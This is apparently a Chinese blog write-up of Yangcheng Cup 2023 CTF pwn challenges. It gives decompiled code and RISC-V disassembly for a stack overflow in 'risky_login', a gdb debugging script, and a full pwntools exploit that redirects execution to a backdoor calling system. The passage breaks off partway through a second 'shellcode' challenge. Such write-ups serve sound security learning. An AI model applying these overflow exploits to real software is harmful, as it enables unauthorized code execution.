<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>羊城杯2023部分题目复现 | nyyyddddn</title>
  <meta name="author" content="nyyyddddn">
  
  <meta name="description" content="题目附件https://github.com/nyyyddddn/ctf/tree/main/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023
risky_login一道riscv64 小端序 栈溢出 ret2text的题目，最新的ida 9.0可以反编译riscv架构的程序，就不需要用难用的ghidra去分析了
int __cdecl main(int argc, const char **argv, const char **envp)
&amp;#123;
  _BYTE v4[288]; // [sp+0h] [-120h] BYREF

  init_io();
  puts(&#34;RiskY LoG1N SySTem&#34;);
  puts(&#34;Input ur name:&#34;);
  read(0, command, 8uLL);
  printf(&#34;Hello, %s&#34;, command);
  puts(&#34;Input ur words&#34;);
  read(0, v4, 0x120uLL);
  my_input(v4);
  puts(&#34;message received&#34;);
  return 0;
&amp;#125;

char *__fastcall my_input(const char *a1)
&amp;#123;
  char v3[248]; // [sp+18h] [-108h] BYREF

  byte_12347070 = strlen(a1);
  if ( (unsigned __int8)byte_12347070 &gt; 8uLL )
  &amp;#123;
    puts(&#34;too long.&#34;);
    exit(-1);
  &amp;#125;
  return strcpy(v3, a1);
&amp;#125;

__int64 backdoor()
&amp;#123;
  puts(&#34;background debug fun.&#34;);
  puts(&#34;input what you want exec&#34;);
  read(0, command, 8uLL);
  if ( strstr(command, &#34;sh&#34;) || strstr(command, &#34;flag&#34;) )
  &amp;#123;
    puts(&#34;no.&#34;);
    exit(-1);
  &amp;#125;
  return system(command);
&amp;#125;

https://ta0lve.github.io/posts/pwn/risc-v/0x01/#%E5%AF%84%E5%AD%98%E5%99%A8%E5%AD%A6%E4%B9%A0
在my input这里存在一个栈溢出，因为strlen只检查低一个字节的数据，那该溢出多少？通过阅读文档可以发现这个ret相当于jmp ra的作用，然后sd  ra, 110h+var_s8(sp) 这个是存储返回地址，所以返回地址在栈底 - 0x8的位置，然后strcpy地址距离栈底 0x108，偏移0x100就刚刚好到返回地址那了
.text:0000000012345786 my_input:                               # CODE XREF: main+7A↓p
.text:0000000012345786
.text:0000000012345786 var_108         = -108h
.text:0000000012345786 var_F8          = -0F8h
.text:0000000012345786 var_s0          =  0
.text:0000000012345786 var_s8          =  8
.text:0000000012345786 arg_0           =  10h
.text:0000000012345786
.text:0000000012345786                 addi            sp, sp, -120h
.text:0000000012345788                 sd              ra, 110h+var_s8(sp)
.text:000000001234578A                 sd              s0, 110h+var_s0(sp)
.text:000000001234578C                 addi            s0, sp, 110h+arg_0
.text:000000001234578E                 sd              a0, -10h+var_108(s0)
.text:0000000012345792                 ld              a0, -10h+var_108(s0)
.text:0000000012345796                 call            strlen
.text:000000001234579E                 mv              a5, a0
.text:00000000123457A0                 andi            a4, a5, 0FFh
.text:00000000123457A4                 sb              a4, byte_12347070
.text:00000000123457A8                 lbu             a5, byte_12347070
.text:00000000123457AC                 mv              a4, a5
.text:00000000123457AE                 li              a5, 8
.text:00000000123457B0                 bgeu            a5, a4, loc_123457CE
.text:00000000123457B4                 lui             a5, %hi(aTooLong) # &#34;too long.&#34;
.text:00000000123457B8                 addi            a0, a5, %lo(aTooLong) # &#34;too long.&#34;
.text:00000000123457BC                 call            puts
.text:00000000123457C4                 li              a0, -1
.text:00000000123457C6                 call            exit
.text:00000000123457CE # ---------------------------------------------------------------------------
.text:00000000123457CE
.text:00000000123457CE loc_123457CE:                           # CODE XREF: my_input+2A↑j
.text:00000000123457CE                 addi            a5, s0, -10h+var_F8
.text:00000000123457D2                 ld              a1, -10h+var_108(s0)
.text:00000000123457D6                 mv              a0, a5
.text:00000000123457D8                 call            strcpy
.text:00000000123457E0                 nop
.text:00000000123457E2                 ld              ra, 110h+var_s8(sp)
.text:00000000123457E4                 ld              s0, 110h+var_s0(sp)
.text:00000000123457E6                 addi            sp, sp, 120h
.text:00000000123457E8                 ret

覆盖返回地址为backdoor，然后cat fl* 就能把flag读出来了
那riscv的程序如何调试呢？？ qemu 有一个 -g的参数可以通过gdb-multiarch remote连上去打断点调试，在process开程序的时候加这个-g的参数就可以通过gdb连上去调试了
debug.sh"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="羊城杯2023部分题目复现"/>
  <meta property="og:site_name" content="nyyyddddn"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">nyyyddddn</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/catergories" title="All the catergories.">
			  <i class=""></i>Catergories
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> 羊城杯2023部分题目复现</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p>题目附件<a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/tree/main/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023">https://github.com/nyyyddddn/ctf/tree/main/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023</a></p>
<h2 id="risky-login"><a href="#risky-login" class="headerlink" title="risky_login"></a>risky_login</h2><p>一道riscv64 小端序 栈溢出 ret2text的题目，最新的ida 9.0可以反编译riscv架构的程序，就不需要用难用的ghidra去分析了</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  _BYTE v4<span class="token punctuation">[</span><span class="token number">288</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [sp+0h] [-120h] BYREF</span>

  <span class="token function">init_io</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"RiskY LoG1N SySTem"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input ur name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> command<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, %s"</span><span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input ur words"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> <span class="token number">0x120uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">my_input</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"message received"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">char</span> <span class="token operator">*</span>__fastcall <span class="token function">my_input</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> v3<span class="token punctuation">[</span><span class="token number">248</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [sp+18h] [-108h] BYREF</span>

  byte_12347070 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>byte_12347070 <span class="token operator">></span> <span class="token number">8uLL</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"too long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token function">strcpy</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

__int64 <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"background debug fun."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"input what you want exec"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> command<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strstr</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strstr</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"no."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://ta0lve.github.io/posts/pwn/risc-v/0x01/#%E5%AF%84%E5%AD%98%E5%99%A8%E5%AD%A6%E4%B9%A0">https://ta0lve.github.io/posts/pwn/risc-v/0x01/#%E5%AF%84%E5%AD%98%E5%99%A8%E5%AD%A6%E4%B9%A0</a></p>
<p>在my input这里存在一个栈溢出，因为strlen只检查低一个字节的数据，那该溢出多少？通过阅读文档可以发现这个ret相当于jmp ra的作用，然后sd  ra, 110h+var_s8(sp) 这个是存储返回地址，所以返回地址在栈底 - 0x8的位置，然后strcpy地址距离栈底 0x108，偏移0x100就刚刚好到返回地址那了</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000012345786</span> my_input<span class="token operator">:</span>                               # CODE XREF<span class="token operator">:</span> main<span class="token operator">+</span><span class="token number">7</span>A↓p
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000012345786</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000012345786</span> var_108         <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">108</span>h
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000012345786</span> var_F8          <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0F</span><span class="token number">8</span>h
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000012345786</span> var_s0          <span class="token operator">=</span>  <span class="token number">0</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000012345786</span> var_s8          <span class="token operator">=</span>  <span class="token number">8</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000012345786</span> arg_0           <span class="token operator">=</span>  <span class="token number">10</span>h
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000012345786</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000012345786</span>                 addi            sp<span class="token punctuation">,</span> sp<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">120</span>h
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000012345788</span>                 sd              ra<span class="token punctuation">,</span> <span class="token number">110</span>h<span class="token operator">+</span><span class="token function">var_s8</span><span class="token punctuation">(</span>sp<span class="token punctuation">)</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000001234578</span>A                 sd              s0<span class="token punctuation">,</span> <span class="token number">110</span>h<span class="token operator">+</span><span class="token function">var_s0</span><span class="token punctuation">(</span>sp<span class="token punctuation">)</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000001234578</span>C                 addi            s0<span class="token punctuation">,</span> sp<span class="token punctuation">,</span> <span class="token number">110</span>h<span class="token operator">+</span>arg_0
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000001234578</span>E                 sd              a0<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">10</span>h<span class="token operator">+</span><span class="token function">var_108</span><span class="token punctuation">(</span>s0<span class="token punctuation">)</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000012345792</span>                 ld              a0<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">10</span>h<span class="token operator">+</span><span class="token function">var_108</span><span class="token punctuation">(</span>s0<span class="token punctuation">)</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000012345796</span>                 call            strlen
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000001234579</span>E                 mv              a5<span class="token punctuation">,</span> a0
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457</span>A0                 andi            a4<span class="token punctuation">,</span> a5<span class="token punctuation">,</span> <span class="token number">0FF</span>h
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457</span>A4                 sb              a4<span class="token punctuation">,</span> byte_12347070
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457</span>A8                 lbu             a5<span class="token punctuation">,</span> byte_12347070
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457</span>AC                 mv              a4<span class="token punctuation">,</span> a5
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457</span>AE                 li              a5<span class="token punctuation">,</span> <span class="token number">8</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457</span>B0                 bgeu            a5<span class="token punctuation">,</span> a4<span class="token punctuation">,</span> loc_123457CE
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457</span>B4                 lui             a5<span class="token punctuation">,</span> <span class="token operator">%</span><span class="token function">hi</span><span class="token punctuation">(</span>aTooLong<span class="token punctuation">)</span> # <span class="token string">"too long."</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457</span>B8                 addi            a0<span class="token punctuation">,</span> a5<span class="token punctuation">,</span> <span class="token operator">%</span><span class="token function">lo</span><span class="token punctuation">(</span>aTooLong<span class="token punctuation">)</span> # <span class="token string">"too long."</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457</span>BC                 call            puts
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457</span>C4                 li              a0<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457</span>C6                 call            exit
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457</span>CE # <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457</span>CE
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457</span>CE loc_123457CE<span class="token operator">:</span>                           # CODE XREF<span class="token operator">:</span> my_input<span class="token operator">+</span><span class="token number">2</span>A↑j
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457</span>CE                 addi            a5<span class="token punctuation">,</span> s0<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">10</span>h<span class="token operator">+</span>var_F8
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457</span>D2                 ld              a1<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">10</span>h<span class="token operator">+</span><span class="token function">var_108</span><span class="token punctuation">(</span>s0<span class="token punctuation">)</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457</span>D6                 mv              a0<span class="token punctuation">,</span> a5
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457</span>D8                 call            strcpy
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457E0</span>                 nop
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457E2</span>                 ld              ra<span class="token punctuation">,</span> <span class="token number">110</span>h<span class="token operator">+</span><span class="token function">var_s8</span><span class="token punctuation">(</span>sp<span class="token punctuation">)</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457E4</span>                 ld              s0<span class="token punctuation">,</span> <span class="token number">110</span>h<span class="token operator">+</span><span class="token function">var_s0</span><span class="token punctuation">(</span>sp<span class="token punctuation">)</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457E6</span>                 addi            sp<span class="token punctuation">,</span> sp<span class="token punctuation">,</span> <span class="token number">120</span>h
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000123457E8</span>                 ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>覆盖返回地址为backdoor，然后cat fl* 就能把flag读出来了</p>
<p>那riscv的程序如何调试呢？？ qemu 有一个 -g的参数可以通过gdb-multiarch remote连上去打断点调试，在process开程序的时候加这个-g的参数就可以通过gdb连上去调试了</p>
<p>debug.sh</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb-multiarch <span class="token parameter variable">-ex</span> <span class="token string">"set architecture riscv"</span> <span class="token punctuation">\</span>
              <span class="token parameter variable">-ex</span> <span class="token string">"set exception-debugger on"</span> <span class="token punctuation">\</span>
              <span class="token parameter variable">-ex</span> <span class="token string">"file ./pwn"</span> <span class="token punctuation">\</span>
              <span class="token parameter variable">-ex</span> <span class="token string">"target remote localhost:1234"</span> <span class="token punctuation">\</span>
              <span class="token parameter variable">-ex</span> <span class="token string">"b *0x12345796"</span> <span class="token punctuation">\</span>
              <span class="token parameter variable">-ex</span> <span class="token string">"c"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'riscv'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>endian <span class="token operator">=</span> <span class="token string">'little'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>

<span class="token comment"># p = process(["qemu-riscv64", "-L", "./", "-g", "1234", "./pwn"])</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-riscv64"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"./"</span><span class="token punctuation">,</span> <span class="token string">"./pwn"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

backdoor <span class="token operator">=</span> <span class="token number">0x123456ee</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input ur name:'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input ur words"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x100</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[0] The Joy Of Contsructing shellcode ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[1] Are You Superstar In Ctfers?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[2] Input: (ye / no)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">2uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"ye"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"xxxx&#123;xxxx_xxxx_xxxx_xxxx&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    <span class="token function">vuln</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[3] Bye~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_13A2</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-3Ch]</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-38h]</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-30h]</span>
  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>s<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-20h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-8h]</span>

  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[3] Your Answer: %s\n"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[4] Welcome To P0P's World!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[5] ======== Input Your P0P Code ========"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">;</span> buf<span class="token punctuation">;</span> <span class="token operator">++</span>buf <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
